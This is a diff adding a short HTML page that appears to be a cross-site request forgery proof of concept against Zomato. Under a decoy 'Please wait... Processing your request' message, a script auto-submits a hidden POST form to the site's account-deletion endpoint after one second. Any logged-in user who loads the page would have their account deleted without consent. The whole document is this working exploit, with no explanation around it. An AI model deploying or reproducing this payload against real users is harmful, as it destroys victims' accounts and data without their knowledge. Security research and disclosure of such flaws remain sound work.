@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<body>
+<h1>Please wait...</h1>
+<div id="status">Processing your request...</div>
+
+<form id="deleteForm" method="POST" action="https://www.zomato.com/webroutes/user/deleteAccount">
+</form>
+
+<script>
+setTimeout(() => {
+    document.getElementById('status').innerHTML = 'Submitting...';
+    document.getElementById('deleteForm').submit();
+}, 1000);
+</script>
+</body>
+</html>
